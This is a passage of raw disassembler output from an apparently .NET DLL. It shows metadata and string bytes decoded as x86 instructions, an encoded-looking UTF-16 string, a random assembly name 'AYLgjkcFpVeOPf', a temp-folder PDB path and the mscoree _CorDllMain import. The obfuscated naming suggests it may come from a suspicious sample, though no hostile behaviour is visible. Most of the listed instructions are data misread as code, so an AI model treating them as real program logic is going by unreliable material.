10004cb9:	48                   	dec    %eax
10004cba:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
10004cbe:	00 41 00             	add    %al,0x0(%ecx)
10004cc1:	32 00                	xor    (%eax),%al
10004cc3:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
10004cc7:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
10004ccb:	65 00 47 00          	add    %al,%gs:0x0(%edi)
10004ccf:	46                   	inc    %esi
10004cd0:	00 79 00             	add    %bh,0x0(%ecx)
10004cd3:	52                   	push   %edx
10004cd4:	00 48 00             	add    %cl,0x0(%eax)
10004cd7:	52                   	push   %edx
10004cd8:	00 51 00             	add    %dl,0x0(%ecx)
10004cdb:	4e                   	dec    %esi
10004cdc:	00 6e 00             	add    %ch,0x0(%esi)
10004cdf:	6c                   	insb   (%dx),%es:(%edi)
10004ce0:	00 6e 00             	add    %ch,0x0(%esi)
10004ce3:	53                   	push   %ebx
10004ce4:	00 48 00             	add    %cl,0x0(%eax)
10004ce7:	68 00 68 00 63       	push   $0x63006800
10004cec:	00 6b 00             	add    %ch,0x0(%ebx)
10004cef:	52                   	push   %edx
10004cf0:	00 56 00             	add    %dl,0x0(%esi)
10004cf3:	50                   	push   %eax
10004cf4:	00 58 00             	add    %bl,0x0(%eax)
10004cf7:	52                   	push   %edx
10004cf8:	00 51 00             	add    %dl,0x0(%ecx)
10004cfb:	4e                   	dec    %esi
10004cfc:	00 6e 00             	add    %ch,0x0(%esi)
10004cff:	6c                   	insb   (%dx),%es:(%edi)
10004d00:	00 6e 00             	add    %ch,0x0(%esi)
10004d03:	53                   	push   %ebx
10004d04:	00 48 00             	add    %cl,0x0(%eax)
10004d07:	68 00 68 00 63       	push   $0x63006800
10004d0c:	00 6b 00             	add    %ch,0x0(%ebx)
10004d0f:	51                   	push   %ecx
10004d10:	00 3d 00 00 15 74    	add    %bh,0x74150000
10004d16:	00 50 00             	add    %dl,0x0(%eax)
10004d19:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
10004d1d:	67 00 48 00          	add    %cl,0x0(%bx,%si)
10004d21:	78 00                	js     0x10004d23
10004d23:	61                   	popa
10004d24:	00 72 00             	add    %dh,0x0(%edx)
10004d27:	44                   	inc    %esp
10004d28:	00 00                	add    %al,(%eax)
10004d2a:	00 00                	add    %al,(%eax)
10004d2c:	6c                   	insb   (%dx),%es:(%edi)
10004d2d:	6c                   	insb   (%dx),%es:(%edi)
10004d2e:	1b 6e c5             	sbb    -0x3b(%esi),%ebp
10004d31:	49                   	dec    %ecx
10004d32:	ef                   	out    %eax,(%dx)
10004d33:	4d                   	dec    %ebp
10004d34:	9c                   	pushf
10004d35:	81 60 f6 75 45 59 c0 	andl   $0xc0594575,-0xa(%eax)
10004d3c:	00 04 20             	add    %al,(%eax,%eiz,1)
10004d3f:	01 01                	add    %eax,(%ecx)
10004d41:	08 03                	or     %al,(%ebx)
10004d43:	20 00                	and    %al,(%eax)
10004d45:	01 05 20 01 01 11    	add    %eax,0x11010120
10004d4b:	11 04 20             	adc    %eax,(%eax,%eiz,1)
10004d4e:	01 01                	add    %eax,(%ecx)
10004d50:	0e                   	push   %cs
10004d51:	04 20                	add    $0x20,%al
10004d53:	01 01                	add    %eax,(%ecx)
10004d55:	02 0c 07             	add    (%edi,%eax,1),%cl
10004d58:	07                   	pop    %es
10004d59:	11 10                	adc    %edx,(%eax)
10004d5b:	11 0c 18             	adc    %ecx,(%eax,%ebx,1)
10004d5e:	18 18                	sbb    %bl,(%eax)
10004d60:	12 45 09             	adc    0x9(%ebp),%al
10004d63:	06                   	push   %es
10004d64:	10 01                	adc    %al,(%ecx)
10004d66:	01 08                	add    %ecx,(%eax)
10004d68:	1e                   	push   %ds
10004d69:	00 04 0a             	add    %al,(%edx,%ecx,1)
10004d6c:	01 11                	add    %edx,(%ecx)
10004d6e:	10 02                	adc    %al,(%edx)
10004d70:	06                   	push   %es
10004d71:	18 05 00 02 02 18    	sbb    %al,0x18020200
10004d77:	18 04 00             	sbb    %al,(%eax,%eax,1)
10004d7a:	00 12                	add    %dl,(%edx)
10004d7c:	61                   	popa
10004d7d:	05 00 01 1d 05       	add    $0x51d0100,%eax
10004d82:	0e                   	push   %cs
10004d83:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
10004d88:	05 05 20 02 0e       	add    $0xe022005,%eax
10004d8d:	0e                   	push   %cs
10004d8e:	0e                   	push   %cs
10004d8f:	04 00                	add    $0x0,%al
10004d91:	01 01                	add    %eax,(%ecx)
10004d93:	08 05 00 01 12 45    	or     %al,0x45120100
10004d99:	08 03                	or     %al,(%ebx)
10004d9b:	20 00                	and    %al,(%eax)
10004d9d:	02 06                	add    (%esi),%al
10004d9f:	07                   	pop    %es
10004da0:	02 12                	add    (%edx),%dl
10004da2:	14 1d                	adc    $0x1d,%al
10004da4:	0e                   	push   %cs
10004da5:	05 15 12 55 01       	add    $0x1551215,%eax
10004daa:	0e                   	push   %cs
10004dab:	05 20 01 01 13       	add    $0x13010120,%eax
10004db0:	00 08                	add    %cl,(%eax)
10004db2:	00 03                	add    %al,(%ebx)
10004db4:	1d 0e 0e 0e 11       	sbb    $0x110e0e0e,%eax
10004db9:	75 06                	jne    0x10004dc1
10004dbb:	15 12 79 02 0e       	adc    $0xe027912,%eax
10004dc0:	02 05 20 02 01 1c    	add    0x1c010220,%al
10004dc6:	18 18                	sbb    %bl,(%eax)
10004dc8:	10 01                	adc    %al,(%ecx)
10004dca:	02 15 12 80 81 01    	add    0x1818012,%dl
10004dd0:	1e                   	push   %ds
10004dd1:	00 15 12 80 81 01    	add    %dl,0x1818012
10004dd7:	1e                   	push   %ds
10004dd8:	00 15 12 79 02 1e    	add    %dl,0x1e027912
10004dde:	00 02                	add    %al,(%edx)
10004de0:	03 0a                	add    (%edx),%ecx
10004de2:	01 0e                	add    %ecx,(%esi)
10004de4:	0d 10 01 01 1d       	or     $0x1d010110,%eax
10004de9:	1e                   	push   %ds
10004dea:	00 15 12 80 81 01    	add    %dl,0x1818012
10004df0:	1e                   	push   %ds
10004df1:	00 04 20             	add    %al,(%eax,%eiz,1)
10004df4:	01 08                	add    %ecx,(%eax)
10004df6:	08 04 00             	or     %al,(%eax,%eax,1)
10004df9:	01 0e                	add    %ecx,(%esi)
10004dfb:	0e                   	push   %cs
10004dfc:	05 20 01 02 13       	add    $0x13020120,%eax
10004e01:	00 08                	add    %cl,(%eax)
10004e03:	b7 7a                	mov    $0x7a,%bh
10004e05:	5c                   	pop    %esp
10004e06:	56                   	push   %esi
10004e07:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
10004e0a:	89 02                	mov    %eax,(%edx)
10004e0c:	06                   	push   %es
10004e0d:	09 02                	or     %eax,(%edx)
10004e0f:	06                   	push   %es
10004e10:	0e                   	push   %cs
10004e11:	02 06                	add    (%esi),%al
10004e13:	08 02                	or     %al,(%edx)
10004e15:	06                   	push   %es
10004e16:	06                   	push   %es
10004e17:	06                   	push   %es
10004e18:	06                   	push   %es
10004e19:	15 12 55 01 0e       	adc    $0xe015512,%eax
10004e1e:	0a 00                	or     (%eax),%al
10004e20:	05 02 18 18 1d       	add    $0x1d181802,%eax
10004e25:	05 09 10 18 04       	add    $0x4181009,%eax
10004e2a:	00 01                	add    %al,(%ecx)
10004e2c:	02 18                	add    (%eax),%bl
10004e2e:	11 00                	adc    %eax,(%eax)
10004e30:	0a 02                	or     (%edx),%al
10004e32:	0e                   	push   %cs
10004e33:	0e                   	push   %cs
10004e34:	18 18                	sbb    %bl,(%eax)
10004e36:	02 09                	add    (%ecx),%cl
10004e38:	18 0e                	sbb    %cl,(%esi)
10004e3a:	10 11                	adc    %dl,(%ecx)
10004e3c:	10 10                	adc    %dl,(%eax)
10004e3e:	11 0c 08             	adc    %ecx,(%eax,%ecx,1)
10004e41:	00 05 18 18 18 09    	add    %al,0x9181818
10004e47:	09 09                	or     %ecx,(%ecx)
10004e49:	0b 00                	or     (%eax),%eax
10004e4b:	07                   	pop    %es
10004e4c:	18 18                	sbb    %bl,(%eax)
10004e4e:	18 09                	sbb    %cl,(%ecx)
10004e50:	18 18                	sbb    %bl,(%eax)
10004e52:	09 10                	or     %edx,(%eax)
10004e54:	18 06                	sbb    %al,(%esi)
10004e56:	00 02                	add    %al,(%edx)
10004e58:	02 18                	add    (%eax),%bl
10004e5a:	10 09                	adc    %cl,(%ecx)
10004e5c:	06                   	push   %es
10004e5d:	00 02                	add    %al,(%edx)
10004e5f:	01 0e                	add    %ecx,(%esi)
10004e61:	1d 05 03 00 00       	sbb    $0x305,%eax
10004e66:	0e                   	push   %cs
10004e67:	04 20                	add    $0x20,%al
10004e69:	01 02                	add    %eax,(%edx)
10004e6b:	0e                   	push   %cs
10004e6c:	08 01                	or     %al,(%ecx)
10004e6e:	00 08                	add    %cl,(%eax)
10004e70:	00 00                	add    %al,(%eax)
10004e72:	00 00                	add    %al,(%eax)
10004e74:	00 1e                	add    %bl,(%esi)
10004e76:	01 00                	add    %eax,(%eax)
10004e78:	01 00                	add    %eax,(%eax)
10004e7a:	54                   	push   %esp
10004e7b:	02 16                	add    (%esi),%dl
10004e7d:	57                   	push   %edi
10004e7e:	72 61                	jb     0x10004ee1
10004e80:	70 4e                	jo     0x10004ed0
10004e82:	6f                   	outsl  %ds:(%esi),(%dx)
10004e83:	6e                   	outsb  %ds:(%esi),(%dx)
10004e84:	45                   	inc    %ebp
10004e85:	78 63                	js     0x10004eea
10004e87:	65 70 74             	gs jo  0x10004efe
10004e8a:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
10004e91:	77 73                	ja     0x10004f06
10004e93:	01 08                	add    %ecx,(%eax)
10004e95:	01 00                	add    %eax,(%eax)
10004e97:	02 00                	add    (%eax),%al
10004e99:	00 00                	add    %al,(%eax)
10004e9b:	00 00                	add    %al,(%eax)
10004e9d:	13 01                	adc    (%ecx),%eax
10004e9f:	00 0e                	add    %cl,(%esi)
10004ea1:	41                   	inc    %ecx
10004ea2:	59                   	pop    %ecx
10004ea3:	4c                   	dec    %esp
10004ea4:	67 6a 6b             	addr16 push $0x6b
10004ea7:	63 46 70             	arpl   %eax,0x70(%esi)
10004eaa:	56                   	push   %esi
10004eab:	65 4f                	gs dec %edi
10004ead:	50                   	push   %eax
10004eae:	66 00 00             	data16 add %al,(%eax)
10004eb1:	05 01 00 00 00       	add    $0x1,%eax
10004eb6:	00 17                	add    %dl,(%edi)
10004eb8:	01 00                	add    %eax,(%eax)
10004eba:	12 43 6f             	adc    0x6f(%ebx),%al
10004ebd:	70 79                	jo     0x10004f38
10004ebf:	72 69                	jb     0x10004f2a
10004ec1:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
10004ec7:	20 20                	and    %ah,(%eax)
10004ec9:	32 30                	xor    (%eax),%dh
10004ecb:	32 34 00             	xor    (%eax,%eax,1),%dh
10004ece:	00 29                	add    %ch,(%ecx)
10004ed0:	01 00                	add    %eax,(%eax)
10004ed2:	24 38                	and    $0x38,%al
10004ed4:	38 34 43             	cmp    %dh,(%ebx,%eax,2)
10004ed7:	45                   	inc    %ebp
10004ed8:	43                   	inc    %ebx
10004ed9:	46                   	inc    %esi
10004eda:	32 2d 30 39 38 45    	xor    0x45383930,%ch
10004ee0:	2d 34 32 45 30       	sub    $0x30453234,%eax
10004ee5:	2d 41 44 34 32       	sub    $0x32344441,%eax
10004eea:	2d 38 45 35 34       	sub    $0x34354538,%eax
10004eef:	46                   	inc    %esi
10004ef0:	35 31 38 37 33       	xor    $0x33373831,%eax
10004ef5:	32 31                	xor    (%ecx),%dh
10004ef7:	00 00                	add    %al,(%eax)
10004ef9:	0c 01                	or     $0x1,%al
10004efb:	00 07                	add    %al,(%edi)
10004efd:	31 2e                	xor    %ebp,(%esi)
10004eff:	30 2e                	xor    %ch,(%esi)
10004f01:	30 2e                	xor    %ch,(%esi)
10004f03:	30 00                	xor    %al,(%eax)
10004f05:	00 49 01             	add    %cl,0x1(%ecx)
10004f08:	00 1a                	add    %bl,(%edx)
10004f0a:	2e 4e                	cs dec %esi
10004f0c:	45                   	inc    %ebp
10004f0d:	54                   	push   %esp
10004f0e:	46                   	inc    %esi
10004f0f:	72 61                	jb     0x10004f72
10004f11:	6d                   	insl   (%dx),%es:(%edi)
10004f12:	65 77 6f             	gs ja  0x10004f84
10004f15:	72 6b                	jb     0x10004f82
10004f17:	2c 56                	sub    $0x56,%al
10004f19:	65 72 73             	gs jb  0x10004f8f
10004f1c:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
10004f23:	38 01                	cmp    %al,(%ecx)
10004f25:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
10004f29:	46                   	inc    %esi
10004f2a:	72 61                	jb     0x10004f8d
10004f2c:	6d                   	insl   (%dx),%es:(%edi)
10004f2d:	65 77 6f             	gs ja  0x10004f9f
10004f30:	72 6b                	jb     0x10004f9d
10004f32:	44                   	inc    %esp
10004f33:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
10004f3a:	61                   	popa
10004f3b:	6d                   	insl   (%dx),%es:(%edi)
10004f3c:	65 12 2e             	adc    %gs:(%esi),%ch
10004f3f:	4e                   	dec    %esi
10004f40:	45                   	inc    %ebp
10004f41:	54                   	push   %esp
10004f42:	20 46 72             	and    %al,0x72(%esi)
10004f45:	61                   	popa
10004f46:	6d                   	insl   (%dx),%es:(%edi)
10004f47:	65 77 6f             	gs ja  0x10004fb9
10004f4a:	72 6b                	jb     0x10004fb7
10004f4c:	20 34 2e             	and    %dh,(%esi,%ebp,1)
10004f4f:	38 04 01             	cmp    %al,(%ecx,%eax,1)
	...
10004f5a:	00 00                	add    %al,(%eax)
10004f5c:	4c                   	dec    %esp
10004f5d:	dc 45 bf             	faddl  -0x41(%ebp)
10004f60:	00 00                	add    %al,(%eax)
10004f62:	00 00                	add    %al,(%eax)
10004f64:	02 00                	add    (%eax),%al
10004f66:	00 00                	add    %al,(%eax)
10004f68:	5b                   	pop    %ebx
10004f69:	00 00                	add    %al,(%eax)
10004f6b:	00 90 4f 00 00 90    	add    %dl,-0x6fffffb1(%eax)
10004f71:	31 00                	xor    %eax,(%eax)
	...
10004f7f:	00 10                	add    %dl,(%eax)
	...
10004f8d:	00 00                	add    %al,(%eax)
10004f8f:	00 52 53             	add    %dl,0x53(%edx)
10004f92:	44                   	inc    %esp
10004f93:	53                   	push   %ebx
10004f94:	16                   	push   %ss
10004f95:	99                   	cltd
10004f96:	b3 5f                	mov    $0x5f,%bl
10004f98:	29 ad 5f 46 89 62    	sub    %ebp,0x6289465f(%ebp)
10004f9e:	6d                   	insl   (%dx),%es:(%edi)
10004f9f:	52                   	push   %edx
10004fa0:	3c 96                	cmp    $0x96,%al
10004fa2:	db b7 01 00 00 00    	(bad) 0x1(%edi)
10004fa8:	43                   	inc    %ebx
10004fa9:	3a 5c 61 70          	cmp    0x70(%ecx,%eiz,2),%bl
10004fad:	70 5c                	jo     0x1000500b
10004faf:	61                   	popa
10004fb0:	73 73                	jae    0x10005025
10004fb2:	65 74 73             	gs je  0x10005028
10004fb5:	5c                   	pop    %esp
10004fb6:	62 69 6e             	bound  %ebp,0x6e(%ecx)
10004fb9:	5c                   	pop    %esp
10004fba:	74 65                	je     0x10005021
10004fbc:	6d                   	insl   (%dx),%es:(%edi)
10004fbd:	70 2d                	jo     0x10004fec
10004fbf:	31 61 65             	xor    %esp,0x65(%ecx)
10004fc2:	38 66 33             	cmp    %ah,0x33(%esi)
10004fc5:	30 64 62 31          	xor    %ah,0x31(%edx,%eiz,2)
10004fc9:	34 61                	xor    $0x61,%al
10004fcb:	5c                   	pop    %esp
10004fcc:	6f                   	outsl  %ds:(%esi),(%dx)
10004fcd:	62 6a 5c             	bound  %ebp,0x5c(%edx)
10004fd0:	52                   	push   %edx
10004fd1:	65 6c                	gs insb (%dx),%es:(%edi)
10004fd3:	65 61                	gs popa
10004fd5:	73 65                	jae    0x1000503c
10004fd7:	5c                   	pop    %esp
10004fd8:	41                   	inc    %ecx
10004fd9:	59                   	pop    %ecx
10004fda:	4c                   	dec    %esp
10004fdb:	67 6a 6b             	addr16 push $0x6b
10004fde:	63 46 70             	arpl   %eax,0x70(%esi)
10004fe1:	56                   	push   %esi
10004fe2:	65 4f                	gs dec %edi
10004fe4:	50                   	push   %eax
10004fe5:	66 2e 70 64          	data16 jo,pn 0x1000504d
10004fe9:	62 00                	bound  %eax,(%eax)
10004feb:	13 50 00             	adc    0x0(%eax),%edx
	...
10004ff6:	00 2d 50 00 00 00    	add    %ch,0x50
10004ffc:	20 00                	and    %al,(%eax)
	...
10005012:	00 1f                	add    %bl,(%edi)
10005014:	50                   	push   %eax
	...
10005021:	5f                   	pop    %edi
10005022:	43                   	inc    %ebx
10005023:	6f                   	outsl  %ds:(%esi),(%dx)
10005024:	72 44                	jb     0x1000506a
10005026:	6c                   	insb   (%dx),%es:(%edi)
10005027:	6c                   	insb   (%dx),%es:(%edi)
10005028:	4d                   	dec    %ebp
10005029:	61                   	popa
1000502a:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
10005031:	72 65                	jb     0x10005098
10005033:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
10005037:	6c                   	insb   (%dx),%es:(%edi)
10005038:	00 00                	add    %al,(%eax)
1000503a:	00 00                	add    %al,(%eax)
1000503c:	00 00                	add    %al,(%eax)
1000503e:	ff 25 00 20 00 10    	jmp    *0x10002000
